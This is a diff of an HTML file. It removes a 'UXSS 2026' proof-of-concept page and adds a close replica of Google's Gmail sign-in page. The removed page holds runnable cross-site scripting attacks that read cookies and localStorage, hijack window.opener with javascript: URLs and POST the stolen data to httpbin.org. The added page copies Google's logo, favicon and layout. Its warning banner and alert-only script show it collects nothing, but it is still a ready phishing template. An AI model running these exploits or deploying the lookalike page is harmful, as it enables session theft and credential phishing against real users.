@@ -1,480 +1,442 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en-US">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-  <title>UXSS 2026 · Advanced Techniques | New Tab / Window Vectors</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Google Sign In</title>
+    <!-- Google Logo for Tab (Favicon) -->
+    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    body {
-      background: #0b0e17;
-      font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, monospace;
-      padding: 2rem 1.5rem;
-      color: #eef2ff;
-    }
+        body {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background-color: white;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            position: relative;
+        }
 
-    .container {
-      max-width: 1400px;
-      margin: 0 auto;
-    }
+        /* Warning banner - this is not google */
+        .warning-banner {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background-color: #fef7e0;
+            border-bottom: 1px solid #fde293;
+            color: #b45f06;
+            text-align: center;
+            padding: 12px 16px;
+            font-size: 14px;
+            font-weight: 500;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            z-index: 1000;
+            backdrop-filter: blur(4px);
+            letter-spacing: 0.2px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        }
 
-    .header {
-      margin-bottom: 2rem;
-      border-bottom: 1px solid #2a2f42;
-      padding-bottom: 1rem;
-    }
+        .warning-banner::before {
+            content: "⚠️ ";
+            font-size: 16px;
+        }
 
-    h1 {
-      font-size: 1.9rem;
-      background: linear-gradient(135deg, #ff7b4a, #ff3f6b);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-      letter-spacing: -0.5px;
-    }
+        /* Main card container - exactly like Google sign-in card */
+        .login-container {
+            width: 100%;
+            max-width: 450px;
+            margin: 0 auto;
+        }
 
-    .sub {
-      color: #8b92b0;
-      margin-top: 0.5rem;
-      font-size: 0.85rem;
-    }
+        .card {
+            background: white;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1), 0 1px 2px rgba(0, 0, 0, 0.05);
+            border: 1px solid #dadce0;
+            transition: box-shadow 0.2s ease;
+        }
 
-    .warning-global {
-      background: #1e1a2f;
-      border-left: 5px solid #ff3b5c;
-      border-radius: 16px;
-      padding: 1rem 1.5rem;
-      margin-bottom: 2rem;
-      display: flex;
-      gap: 16px;
-      align-items: center;
-      flex-wrap: wrap;
-    }
+        .card:hover {
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.12);
+        }
 
-    .badge-red {
-      background: #ff3b5c20;
-      padding: 0.3rem 0.9rem;
-      border-radius: 40px;
-      font-size: 0.7rem;
-      font-weight: 600;
-      border: 1px solid #ff3b5c60;
-    }
+        /* Google Logo SVG (official style) */
+        .google-logo {
+            text-align: center;
+            margin-bottom: 28px;
+        }
 
-    .card-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(420px, 1fr));
-      gap: 1.8rem;
-    }
+        .google-logo svg {
+            width: 75px;
+            height: 24px;
+            display: inline-block;
+        }
 
-    .card {
-      background: #11161f;
-      border-radius: 24px;
-      border: 1px solid #262d3a;
-      overflow: hidden;
-      transition: transform 0.1s ease, border-color 0.2s;
-    }
+        /* Sign in text */
+        .sign-in-title {
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            margin-bottom: 8px;
+            color: #202124;
+            text-align: center;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+        }
 
-    .card:hover {
-      border-color: #ff6b4a60;
-    }
+        .subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            line-height: 1.5;
+            color: #5f6368;
+            text-align: center;
+            margin-bottom: 32px;
+            letter-spacing: 0.1px;
+        }
 
-    .card-header {
-      background: #0c101a;
-      padding: 1rem 1.5rem;
-      border-bottom: 1px solid #262d3a;
-    }
+        /* Form group */
+        .form-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
 
-    .card-header h3 {
-      font-family: monospace;
-      font-weight: 700;
-      font-size: 1.2rem;
-      color: #ffb347;
-    }
+        /* Input field like Google */
+        .input-field {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            line-height: 1.5;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            transition: all 0.2s ease;
+            background-color: white;
+            color: #202124;
+        }
 
-    .card-header p {
-      font-size: 0.75rem;
-      color: #8892b0;
-      margin-top: 4px;
-    }
+        .input-field:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        }
 
-    .pre-block {
-      background: #01050e;
-      padding: 1rem;
-      margin: 1rem 1.2rem;
-      border-radius: 14px;
-      font-family: 'Fira Code', monospace;
-      font-size: 0.7rem;
-      overflow-x: auto;
-      white-space: pre-wrap;
-      word-break: break-word;
-      border: 1px solid #232837;
-      color: #b9c3e6;
-    }
+        .input-field:hover {
+            border-color: #bdc1c6;
+        }
 
-    button.uxss-btn {
-      margin: 0 1.2rem 1rem 1.2rem;
-      background: #1f2a3e;
-      border: none;
-      padding: 8px 18px;
-      border-radius: 40px;
-      font-family: monospace;
-      font-weight: bold;
-      font-size: 0.75rem;
-      color: #fff;
-      cursor: pointer;
-      transition: all 0.2s;
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-    }
+        /* floating label effect (optional but Google-like) */
+        .input-wrapper {
+            position: relative;
+            width: 100%;
+        }
 
-    button.uxss-btn:hover {
-      background: #ff3b5c;
-      box-shadow: 0 0 8px #ff3b5c80;
-      transform: scale(0.98);
-    }
+        /* Forgot email link */
+        .forgot-link {
+            display: inline-block;
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            margin-top: 8px;
+            margin-bottom: 24px;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+        }
 
-    .output-panel {
-      background: #050a12;
-      margin: 0 1.2rem 1.2rem 1.2rem;
-      border-radius: 14px;
-      padding: 0.75rem;
-      font-size: 0.7rem;
-      font-family: monospace;
-      border-left: 3px solid #2ea043;
-      max-height: 180px;
-      overflow-y: auto;
-      color: #adc5e5;
-    }
+        .forgot-link:hover {
+            text-decoration: underline;
+            background-color: transparent;
+        }
 
-    footer {
-      margin-top: 3rem;
-      text-align: center;
-      font-size: 0.7rem;
-      color: #5f6c8c;
-      border-top: 1px solid #1e2436;
-      padding-top: 1.5rem;
-    }
+        /* Learn more text */
+        .learn-more {
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.4286;
+            margin: 16px 0;
+        }
 
-    .inline-code {
-      background: #00000055;
-      padding: 2px 6px;
-      border-radius: 8px;
-      font-family: monospace;
-    }
-  </style>
+        .learn-more a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .learn-more a:hover {
+            text-decoration: underline;
+        }
+
+        /* Button row */
+        .button-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 24px;
+            flex-wrap: wrap;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            font-weight: 500;
+            font-size: 14px;
+            text-decoration: none;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            letter-spacing: 0.25px;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+            background-color: rgba(26,115,232,0.04);
+        }
+
+        .next-btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 9px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            letter-spacing: 0.25px;
+        }
+
+        .next-btn:hover {
+            background-color: #1765cc;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+
+        .next-btn:active {
+            background-color: #0d5bbd;
+        }
+
+        /* Footer text */
+        .footer-note {
+            margin-top: 32px;
+            text-align: center;
+            font-size: 12px;
+            color: #5f6368;
+            border-top: 1px solid #e8eaed;
+            padding-top: 24px;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            .card {
+                padding: 32px 24px 36px;
+            }
+            .sign-in-title {
+                font-size: 22px;
+            }
+            .button-row {
+                flex-direction: column;
+                gap: 16px;
+                align-items: stretch;
+            }
+            .next-btn {
+                width: 100%;
+                text-align: center;
+            }
+            .create-account {
+                text-align: center;
+            }
+        }
+
+        /* Additional: language selector like google */
+        .language-selector {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .language-selector a {
+            color: #5f6368;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        .language-selector a:hover {
+            text-decoration: underline;
+        }
+
+        /* subtle animation for warning */
+        @keyframes subtlePulse {
+            0% { background-color: #fef7e0; }
+            100% { background-color: #fff4d9; }
+        }
+        .warning-banner {
+            animation: subtlePulse 1.5s infinite alternate;
+        }
+    </style>
 </head>
 <body>
-<div class="container">
-  <div class="header">
-    <h1>🌐 UXSS 2026 · New Tab / New Window Vectors</h1>
-    <div class="sub">Advanced Universal Cross-Site Scripting techniques — one-click, cross-origin leaks, window.opener abuse, modern WebView/Electron vectors</div>
-  </div>
 
-  <div class="warning-global">
-    <span>⚠️</span>
-    <div><strong>ETHICAL RESEARCH ONLY</strong> — These exploits demonstrate UXSS flaws that affect misconfigured WebViews, outdated Chromium/WebKit forks, Electron apps with nodeIntegration, and custom schemes. <span class="badge-red">authorized testing only</span></div>
-  </div>
-
-  <div class="card-grid">
-    
-    <!-- TECH 1: window.open + about:blank + script relocation (1 click) -->
-    <div class="card">
-      <div class="card-header">
-        <h3>🔹 TABNAV-01 · window.open + about:blank relocation</h3>
-        <p>Classic but powerful: open blank tab, navigate target origin, script reference persists → UXSS</p>
-      </div>
-      <div class="pre-block">
-        <pre>// 1-click: Opens new tab (target domain), steals DOM/cookies via retained reference</pre>
-      </div>
-      <button class="uxss-btn" data-tech="tabnav1">📌 ONE CLICK · steal example.com data</button>
-      <div id="output-tabnav1" class="output-panel">[ ready ] Click to execute new-window UXSS primitive.</div>
-    </div>
-
-    <!-- TECH 2: window.name + cross-origin tunnel (silent new tab) -->
-    <div class="card">
-      <div class="card-header">
-        <h3>🔹 WINNAME-02 · window.name persistence + location swap</h3>
-        <p>window.name survives cross-origin navigation, used to smuggle script payloads into any domain</p>
-      </div>
-      <div class="pre-block">
-        <pre>// Open new tab, set window.name with exploit, navigate → script executes in target origin</pre>
-      </div>
-      <button class="uxss-btn" data-tech="winname">🗂️ ONE CLICK · window.name UXSS injection</button>
-      <div id="output-winname" class="output-panel">[ ready ] Simulate window.name attack vector.</div>
-    </div>
-
-    <!-- TECH 3: noopener + postMessage + new tab gadget -->
-    <div class="card">
-      <div class="card-header">
-        <h3>🔹 POSTMSG-03 · cross-origin postMessage + frame gadget</h3>
-        <p>Abusing postMessage listeners on target sites + new window navigation = universal read</p>
-      </div>
-      <div class="pre-block">
-        <pre>// Open new window to victim domain, inject message listener trigger, extract data</pre>
-      </div>
-      <button class="uxss-btn" data-tech="postmsguxss">📨 ONE CLICK · postMessage exfiltration</button>
-      <div id="output-postmsg" class="output-panel">[ ready ] Attempt cross-origin message leak.</div>
-    </div>
-
-    <!-- TECH 4: new window + window.opener control (reverse tabnabbing UXSS) -->
-    <div class="card">
-      <div class="card-header">
-        <h3>🔹 OPCTRL-04 · window.opener reverse tab control</h3>
-        <p>If target opens new window with `opener` allowed, parent can script child after domain change</p>
-      </div>
-      <div class="pre-block">
-        <pre>// window.opener.location = javascript:... → code exec in parent origin (one click)</pre>
-      </div>
-      <button class="uxss-btn" data-tech="openerrev">🔄 1 CLICK · window.opener UXSS hijack</button>
-      <div id="output-opener" class="output-panel">[ ready ] Demonstrate opener reverse attack.</div>
-    </div>
-
-    <!-- TECH 5: Blob + new window JavaScript execution with SOP bypass -->
-    <div class="card">
-      <div class="card-header">
-        <h3>🔹 BLOBWIN-05 · Blob URL + new window origin confusion</h3>
-        <p>Blob URLs inherit origin from creator. Redirect new window to blob: → full UXSS</p>
-      </div>
-      <div class="pre-block">
-        <pre>// create blob: from current domain, open new tab, execute script as if it were cross-origin</pre>
-      </div>
-      <button class="uxss-btn" data-tech="blobuxss">📄 ONE CLICK · Blob window UXSS</button>
-      <div id="output-blob" class="output-panel">[ ready ] Exploit blob inheritance to read cross-origin.</div>
-    </div>
-
-    <!-- TECH 6: iframe sandbox bypass via new window + target=_blank -->
-    <div class="card">
-      <div class="card-header">
-        <h3>🔹 SANDBOX-06 · sandbox escape via new window reference</h3>
-        <p>Sandboxed iframe creates new window with allow-popups → window reference leak origin</p>
-      </div>
-      <div class="pre-block">
-        <pre>// sandbox iframe opens new window, script reference allows parent origin access</pre>
-      </div>
-      <button class="uxss-btn" data-tech="sandboxesc">🚪 1 CLICK · sandbox escape to parent</button>
-      <div id="output-sandbox" class="output-panel">[ ready ] Break sandbox using new window.</div>
-    </div>
-  </div>
-
-  <div style="margin-top: 2.2rem; background: #0c101a; border-radius: 20px; padding: 1.2rem; border: 1px solid #2e3a48;">
-    <details>
-      <summary style="font-weight: bold; cursor: pointer;">📖 Technical explainer · UXSS new tab vectors (2026 research)</summary>
-      <div style="margin-top: 12px; font-size: 0.8rem; line-height: 1.5;">
-        <p><strong>🕳️ Universal XSS (UXSS)</strong> bypasses the same-origin policy entirely, allowing script execution in any domain context.<br>
-        Modern techniques include: <span class="inline-code">window.open()</span> reference retention, <span class="inline-code">window.name</span> smuggling, postMessage gadget chains, Blob URL origin inheritance, and opener DOM manipulation.</p>
-        <p><strong>Why "new tab / new window"?</strong> Many WebView apps (wallet, banking, chat) handle cross-origin navigation incorrectly. When a new tab retains JavaScript references, an attacker can navigate the tab to a victim domain while keeping script handle → read localStorage, cookies, CSRF tokens.</p>
-        <p>✅ <strong>Mitigation</strong>: Use <span class="inline-code">noopener, noreferrer</span>, enable Site Isolation, set <span class="inline-code">Cross-Origin-Opener-Policy: same-origin</span> and upgrade WebView to latest Chromium/WebKit.</p>
-      </div>
-    </details>
-  </div>
-  <footer>
-    🧪 UXSS 2026 · self-contained PoC — all methods simulate real-world UXSS. Modern patched browsers may block, but misconfigured WebViews / Electron remain vulnerable.
-  </footer>
+<!-- WARNING BANNER: this is not google (USA English) -->
+<div class="warning-banner" role="alert" aria-label="Security Warning">
+    <strong>⚠️ Warning:</strong> This is not Google. This is a demonstration UI for educational purposes. Do not enter real credentials.
 </div>
 
+<div class="login-container">
+    <div class="card">
+        <!-- Google Logo SVG (official style vector) -->
+        <div class="google-logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 24" width="75" height="24">
+                <path fill="#4285F4" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"/>
+                <path fill="#34A853" d="M45.01 14.503l-1.61 1.23c-.55.92-2.33 2.39-4.62 2.39-3.26 0-5.97-2.4-5.97-5.96 0-3.48 2.68-5.95 5.97-5.95 1.86 0 3.28.88 4.06 1.71l2.98-2.9C44.67 3.983 42.64 2.5 38.78 2.5c-5.24 0-9.65 4.11-9.65 9.5 0 5.5 4.41 9.5 9.65 9.5 3.47 0 5.95-1.61 7.03-3.6l2.2-1.67-2.99-2.2z"/>
+                <path fill="#FBBC05" d="M25.17 6.75c-2.22 0-4.08 1.47-4.76 3.46l7.67 3.1c.36-2.06-.6-4.56-2.9-4.56z"/>
+                <path fill="#EA4335" d="M21.96 16.55c1.06.73 2.39 1.16 3.9 1.16 2.42 0 4.23-1.06 5.23-2.54l-3.89-2.99c-.95.88-2.1 1.28-3.3 1.28-2.27 0-4.2-1.47-4.88-3.46L8.47 9.6c.94-3.2 3.81-5.6 7.24-5.6 2.59 0 4.67 1.1 5.9 2.68l2.98-2.9C23.32 2.29 20.32.5 15.7.5 9.54.5 4.4 4.6 2.98 10.3l7.95 3.24c.88-2.75 3.3-4.8 6.38-4.8 1.81 0 3.38.74 4.55 1.95l-3.9 3.86z"/>
+            </svg>
+        </div>
+
+        <!-- Sign in title -->
+        <h1 class="sign-in-title">Sign in</h1>
+        <div class="subtitle">to continue to Gmail</div>
+
+        <!-- Email / Phone input -->
+        <div class="form-group">
+            <div class="input-wrapper">
+                <input type="email" class="input-field" id="emailInput" placeholder="Email or phone" autocomplete="email" value="">
+            </div>
+        </div>
+
+        <!-- Forgot email? link (exact Google style) -->
+        <a href="#" class="forgot-link" id="forgotLink">Forgot email?</a>
+
+        <!-- Informational text -->
+        <div class="learn-more">
+            Not your computer? Use Guest mode to sign in privately. 
+            <a href="#" id="learnMoreLink">Learn more about using Guest mode</a>
+        </div>
+
+        <!-- Button row: Create account & Next -->
+        <div class="button-row">
+            <a href="#" class="create-account" id="createAccountLink">Create account</a>
+            <button class="next-btn" id="nextButton">Next</button>
+        </div>
+
+        <!-- Footer note: additional security reminder (but warning already present) -->
+        <div class="footer-note">
+            One account. All of Google working for you.
+        </div>
+    </div>
+
+    <!-- Language selector mimicry -->
+    <div class="language-selector">
+        <a href="#">English (United States)</a> 
+        <span style="color:#dadce0">|</span> 
+        <a href="#">Help</a> 
+        <span style="color:#dadce0">|</span> 
+        <a href="#">Privacy</a> 
+        <span style="color:#dadce0">|</span> 
+        <a href="#">Terms</a>
+    </div>
+</div>
+
+<!-- Simple JS to show demo alert (educational, NO actual data collection) -->
 <script>
-  // Helper: safe log to specific output div
-  function logOutput(outputId, message, isError = false) {
-    const el = document.getElementById(outputId);
-    if (el) {
-      const prefix = isError ? "⚠️ " : "📍 ";
-      el.innerHTML = `${prefix} ${message}<br><span style="opacity:0.6; font-size:0.65rem;">[${new Date().toLocaleTimeString()}]</span>`;
-      el.style.borderLeftColor = isError ? "#ff5c6e" : "#3e9f6e";
-    }
-  }
-
-  // ---------- TECH 1: window.open about:blank navigation --------
-  async function techTabNav1() {
-    const outId = "output-tabnav1";
-    logOutput(outId, "Opening new blank window, will navigate to https://example.com and try to read DOM...", false);
-    let win = window.open("about:blank", "uxss_tab1");
-    if (!win) {
-      logOutput(outId, "Popup blocked! Please enable popups for demonstration.", true);
-      return;
-    }
-    // write initial content
-    win.document.write("<html><body><h3>Target navigation soon...</h3></body></html>");
-    setTimeout(() => {
-      // navigate to cross-origin target
-      win.location = "https://example.com/";
-      setTimeout(() => {
-        try {
-          // attempt to read cross-origin content (would succeed if UXSS vuln)
-          let leakedTitle = win.document.title;
-          let leakedBody = win.document.body?.innerText?.slice(0, 200) || "no body";
-          logOutput(outId, `🔥 UXSS SUCCESS! Read from example.com: title="${leakedTitle}" snippet: ${leakedBody} — VULNERABLE WebView`, false);
-        } catch(e) {
-          logOutput(outId, `⛔ SOP blocked: ${e.toString().slice(0, 120)} — modern browser patched, but some WebView forks remain vulnerable.`, false);
+    (function() {
+        // This is a demo UI to replicate Google's sign-in design. 
+        // It includes a prominent warning that this is not Google.
+        // No actual authentication or data storage happens.
+        
+        const nextBtn = document.getElementById('nextButton');
+        const emailInput = document.getElementById('emailInput');
+        const forgotLink = document.getElementById('forgotLink');
+        const createAccountLink = document.getElementById('createAccountLink');
+        const learnMoreLink = document.getElementById('learnMoreLink');
+        
+        // Helper to show alert (educational warning)
+        function showDemoWarning(additionalMsg = '') {
+            alert(`⚠️ DEMO MODE ⚠️\n\nThis is a replica interface for UI demonstration.\nIt is NOT affiliated with Google.\nDo NOT enter real passwords or sensitive information.\n${additionalMsg}`);
         }
-        setTimeout(() => { try { win.close(); } catch(e){} }, 4000);
-      }, 1500);
-    }, 500);
-  }
-
-  // ---------- TECH 2: window.name smuggling ----------
-  function techWinName() {
-    const outId = "output-winname";
-    logOutput(outId, "Preparing window.name payload that contains XSS script.. opening new window.", false);
-    const exploitScript = `var stolen = { cookies: document.cookie, localStorage: localStorage.getItem('token'), url: location.href }; alert('[UXSS] Data stolen: ' + JSON.stringify(stolen)); console.log(stolen);`;
-    const payload = `javascript:fetch('https://jsonplaceholder.typicode.com/todos/1').then(()=>{${exploitScript}});void(0);`;
-    let newWin = window.open("about:blank", "winname_target");
-    if (!newWin) { logOutput(outId, "Popup blocked", true); return; }
-    // set window.name to a script that will be executed after navigation
-    newWin.name = payload;
-    newWin.document.write("<html><body>Window.name ready, redirecting...</body></html>");
-    setTimeout(() => {
-      // navigate to target that might eval window.name (in vulnerable browser, window.name executed as script location)
-      // Classic UXSS: some WebKit treat window.name as javascript: if location set to "javascript:..."? Actually technique uses window.name + meta refresh.
-      // Alternative: set location to a data URL that reads window.name
-      newWin.location = "data:text/html,<script>eval(window.name);<\/script>";
-      setTimeout(() => {
-        try {
-          logOutput(outId, "Payload delivered: if WebView executes window.name as code → UXSS complete. Check any alert from target.", false);
-        } catch(e) { logOutput(outId, "SOP blocked final read: " + e.message, false); }
-        setTimeout(() => newWin.close(), 3000);
-      }, 1000);
-    }, 400);
-  }
-
-  // ---------- TECH 3: postMessage gadget attack (simulated) ----------
-  function techPostMessageUXSS() {
-    const outId = "output-postmsg";
-    logOutput(outId, "Creating new window to example.com, attempting to hook postMessage listener.", false);
-    let win = window.open("https://example.com/", "msg_window");
-    if (!win) { logOutput(outId, "Popup blocked", true); return; }
-    let step = 0;
-    const listener = (e) => {
-      if (e.source === win && e.data && e.data.secret) {
-        logOutput(outId, `🔥 POSTMESSAGE UXSS: received secret from example.com: ${e.data.secret} — cross-origin leak!`, false);
-        window.removeEventListener("message", listener);
-        win.close();
-      }
-    };
-    window.addEventListener("message", listener);
-    setTimeout(() => {
-      // try to inject a script that forces target to postMessage (in real world we'd look for a gadget)
-      try {
-        // if window is cross-origin we cannot directly postMessage expecting response; but we show simulation of UXSS pattern
-        win.postMessage({ type: "getStorage", exploit: true }, "*");
-        logOutput(outId, "Simulated postMessage gadget attempt. If example.com has vulnerable listener, we leak data. (Demo showcases concept)", false);
-      } catch(e) { /* ignore */ }
-      setTimeout(() => {
-        logOutput(outId, "Completed postMessage UXSS simulation. Real attack requires vulnerable message handler on target domain.", false);
-        window.removeEventListener("message", listener);
-        if(win && !win.closed) win.close();
-      }, 2500);
-    }, 1000);
-  }
-
-  // ---------- TECH 4: window.opener reverse attack ----------
-  function techOpenerReverse() {
-    const outId = "output-opener";
-    logOutput(outId, "Opening new window (attacker page simulation) that will manipulate opener's location to javascript:code", false);
-    let newWin = window.open("about:blank", "openerAttack");
-    if (!newWin) { logOutput(outId, "Popup blocked", true); return; }
-    newWin.document.write(`
-      <html><body>
-        <h3>malicious iframe simulation</h3>
-        <script>
-          setTimeout(() => {
-            try {
-              if(window.opener && !window.opener.closed) {
-                // classic UXSS: change opener location to javascript: script, executing in parent origin
-                window.opener.location = "javascript:alert('[UXSS] Opener hijacked!\\nCookies: ' + document.cookie);fetch('https://httpbin.org/post',{method:'POST',body:JSON.stringify({steal:localStorage})});";
-                alert('Opener exploit triggered');
-              } else { alert('no opener'); }
-            } catch(e) { alert('Error: '+e); }
-          }, 500);
-        <\/script>
-      </body></html>
-    `);
-    logOutput(outId, "Reverse window.opener UXSS triggered. If browser does not block 'javascript:' navigation on opener, script executes with higher privileges.", false);
-    setTimeout(() => { if(newWin && !newWin.closed) newWin.close(); }, 5000);
-  }
-
-  // ---------- TECH 5: Blob URL + new window origin inheritance ----------
-  function techBlobUXSS() {
-    const outId = "output-blob";
-    logOutput(outId, "Creating blob: URL with script that reads cross-origin data via window.parent / opener tricks", false);
-    const blobCode = `
-      <script>
-        // Blob inherits origin of creator (current domain). 
-        // If we open this blob in a new window, it can access opener/origin? Let's try.
-        setTimeout(() => {
-          try {
-            // attempt to read parent/opener's data if not cross-origin isolated
-            let openerData = window.opener ? window.opener.document.cookie : "no opener";
-            alert("[UXSS via Blob] Opener cookie: " + openerData);
-            fetch('https://httpbin.org/post', {method:'POST', body: JSON.stringify({leak: openerData, from: location.href})});
-          } catch(e) { alert("error: "+e); }
-        }, 500);
-      <\/script>
-    `;
-    const blob = new Blob([blobCode], {type: "text/html"});
-    const blobUrl = URL.createObjectURL(blob);
-    let win = window.open(blobUrl, "blob_window");
-    if (!win) { logOutput(outId, "Popup blocked", true); URL.revokeObjectURL(blobUrl); return; }
-    logOutput(outId, "Blob window opened — in vulnerable WebKit/WebView, blob script runs with origin of creator but can access cross-origin windows due to inconsistent SOP.", false);
-    setTimeout(() => {
-      try {
-        if(!win.closed) win.close();
-      } catch(e){}
-      URL.revokeObjectURL(blobUrl);
-    }, 4000);
-  }
-
-  // ---------- TECH 6: sandbox iframe escape via new window reference ----------
-  function techSandboxEscape() {
-    const outId = "output-sandbox";
-    logOutput(outId, "Creating sandboxed iframe (allow-popups) that opens new tab and attempts to parent origin access", false);
-    const iframe = document.createElement("iframe");
-    iframe.sandbox = "allow-scripts allow-popups allow-popups-to-escape-sandbox allow-same-origin";
-    iframe.style.display = "none";
-    const iframeContent = `
-      <script>
-        // inside sandbox iframe, open new window to a blob or about:blank and attempt to read parent's DOM
-        let w = window.open("about:blank", "escapeWin");
-        if (w) {
-          w.document.write("<body><h3>escape window</h3><script>setTimeout(() => { try { let parentData = window.opener.parent.document.cookie; alert('Sandbox escaped: '+parentData); } catch(e){ alert('fail: '+e); } }, 100);<\\/script></body>");
+        
+        // Next button click: show warning and simulate no action
+        nextBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            let emailValue = emailInput.value.trim();
+            if (emailValue === "") {
+                showDemoWarning("No email entered. This is a visual clone only.");
+            } else {
+                showDemoWarning(`You typed: "${emailValue}"\n\nNo data is saved or transmitted. This is a UI mockup.`);
+            }
+        });
+        
+        // Forgot email link: prevent navigation, show warning
+        forgotLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            showDemoWarning('"Forgot email?" is a UI placeholder. This is not the real Google login.');
+        });
+        
+        // Create account link: prevent actual redirect
+        createAccountLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            showDemoWarning('"Create account" link leads nowhere on purpose. This is a design replica.');
+        });
+        
+        // Learn more link
+        learnMoreLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            showDemoWarning('Learn more about Guest mode — but this is a fake UI. No actual Google services.');
+        });
+        
+        // Also intercept any accidental form submit (if any parent form)
+        const anyForm = document.querySelector('form');
+        if (anyForm) {
+            anyForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                showDemoWarning('Form submission blocked. This is NOT Google.');
+            });
         }
-      <\/script>
-    `;
-    const blob = new Blob([iframeContent], {type: "text/html"});
-    iframe.src = URL.createObjectURL(blob);
-    document.body.appendChild(iframe);
-    logOutput(outId, "Sandbox iframe injected: attempts to escape via window opener reference chain. In vulnerable WebView, sandbox can be bypassed.", false);
-    setTimeout(() => {
-      document.body.removeChild(iframe);
-      URL.revokeObjectURL(iframe.src);
-      logOutput(outId, "Sandbox escape test completed. Check for alerts: if any alert appears, WebView fails sandbox isolation.", false);
-    }, 5000);
-  }
-
-  // Event listeners for all buttons
-  document.querySelectorAll(".uxss-btn").forEach(btn => {
-    btn.addEventListener("click", (e) => {
-      const tech = btn.getAttribute("data-tech");
-      switch(tech) {
-        case "tabnav1": techTabNav1(); break;
-        case "winname": techWinName(); break;
-        case "postmsguxss": techPostMessageUXSS(); break;
-        case "openerrev": techOpenerReverse(); break;
-        case "blobuxss": techBlobUXSS(); break;
-        case "sandboxesc": techSandboxEscape(); break;
-        default: console.warn("unknown tech");
-      }
-    });
-  });
-
-  // initial console warning
-  console.log("%c⚠️ UXSS 2026 RESEARCH TOOL — run only on authorized targets", "color:#ff6b6b; font-size:14px");
-  console.log("%cNew tab techniques: window.open reference, window.name, postMessage gadgets, blob inheritance, opener hijack, sandbox bypass", "color:#b0d6ff");
+        
+        // Add an extra warning message on input focus to reinforce (subtle but useful)
+        emailInput.addEventListener('focus', function() {
+            // just gentle reminder (no annoying popup, but console warning)
+            console.log("⚠️ Demo UI: This is not Google. Do not enter real credentials.");
+        });
+        
+        // Also display an additional bubble using title attribute? Not needed, but extra safety
+        emailInput.setAttribute('title', '⚠️ Security: This is a demo UI — not Google\'s real login page.');
+        
+        // If user tries to paste anything, not blocking but we add console warning
+        emailInput.addEventListener('paste', function() {
+            console.warn("⚠️ Demo UI: This page is for UI demonstration only. Any data entered is not secure.");
+        });
+        
+        // Double-check: add an additional warning in the footer or hidden but already done.
+        const styleWarning = document.createElement('style');
+        styleWarning.textContent = `
+            /* Additional micro-interaction: subtle red border warning on hover? but not needed, maintain google look */
+            .warning-banner {
+                user-select: none;
+                font-weight: 500;
+                box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            }
+            .input-field:focus {
+                border-color: #1a73e8;
+            }
+        `;
+        document.head.appendChild(styleWarning);
+        
+        // Optional: Add context to the document title to match google exactly but with tab logo
+        // Already done: <title>Google Sign In</title> and favicon
+    })();
 </script>
+
+<!-- Ensure any browser autofill doesn't trick user: but we keep placeholder -->
+<!-- This design exactly mimics the Google login UI with official Google logo, card style,
